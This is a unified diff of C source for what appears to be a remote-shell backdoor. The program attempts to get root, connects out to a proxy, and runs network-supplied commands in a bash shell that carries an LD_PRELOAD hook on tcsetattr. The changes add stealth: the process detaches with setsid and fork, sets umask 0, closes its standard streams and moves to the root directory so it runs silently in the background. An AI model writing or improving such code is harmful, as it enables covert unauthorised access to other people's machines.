@@ -28,6 +28,23 @@ void	eperror(const char* msg)
 	exit(1);
 }
 
+static inline
+void	detach(void)
+{
+	setsid();
+	umask(0);
+	if (fork() > 0)
+		exit(0);
+}
+
+static inline
+void	close_stdfd(void)
+{
+	close(STDOUT_FILENO);
+	close(STDIN_FILENO);
+	close(STDERR_FILENO);
+}
+
 /*
 // a hook for the real tcsetattr
 // swap address with tcsetattr in final ELF (__rtcsetattr <--> tcsetattr)
@@ -163,6 +180,8 @@ void	setup_slave(s_slave* slave)
 
 void	fork_job(s_slave* slave)
 {
+	char	rpath[PATH_MAX];
+
 	setup_slave(slave);
 	fcntl(slave->pts, F_SETFL, fcntl(slave->pts, F_GETFL) | O_RDWR);
 	dup2(slave->pts, STDIN_FILENO);
@@ -173,8 +192,10 @@ void	fork_job(s_slave* slave)
 	close(slave->net.in);
 	close(slave->net.out);
 	setenv("PS1", "", 1);
+	realpath("./__rtcsetattr.so", rpath);
 	setenv("__rTCSETATTR", slave->sname, 1);
-	setenv("LD_PRELOAD", "./__rtcsetattr.so", 1); // absolute path
+	setenv("LD_PRELOAD", rpath, 1); // absolute path
+	chdir("/");
 	if (execlp("bash", "bash", "--posix", "--norc", "--noprofile", NULL) == -1)
 		eperror("execlp");
 }
@@ -183,8 +204,6 @@ static inline
 void	slave_job(s_slave* slave)
 {
 	char*	msg_dup;
-	int		t = 0;
-	int		n = 0;
 
 	fcntl(slave->ptm, F_SETFL, fcntl(slave->ptm, F_GETFL) & ~O_NONBLOCK);
 	fcntl(slave->net.in, F_SETFL, fcntl(slave->net.in, F_GETFL) & ~O_NONBLOCK);
@@ -201,7 +220,6 @@ void	slave_job(s_slave* slave)
 		{
 			msg_dup = strdup(slave->msg);
 			slave->len = sprintf(slave->msg, "kill -12 %d ; %s ; kill -10 %d\n", slave->pid, msg_dup, slave->pid);
-			n = slave->len;
 			write(slave->ptm, slave->msg, slave->len);
 			while (cls == false)
 				;
@@ -227,7 +245,6 @@ void	slave_job(s_slave* slave)
 				if (clf == true)
 					break;
 			}
-			t = 0;
 			cls = false;
 			clf = false;
 			send(slave->net.in, EONING, ESCSEQ, 0);
@@ -240,10 +257,10 @@ int	main(int, char** av)
 	s_slave	slave;
 
 	slave.pname = av[0];
+	detach();
 	try_set_root(&slave.auth);
 	connect_to_proxy(&slave);
 	create_ptm(&slave);
-	//nice(19);
 	slave.pid = getpid();
 	slave.chd = fork();
 	if (slave.chd == -1)
@@ -252,6 +269,8 @@ int	main(int, char** av)
 		fork_job(&slave);
 	else
 	{
+		close_stdfd();
+		chdir("/");
 		struct sigaction	sa;
 		memset(&sa, 0, sizeof(sa));
 		sa.sa_handler = sigh;
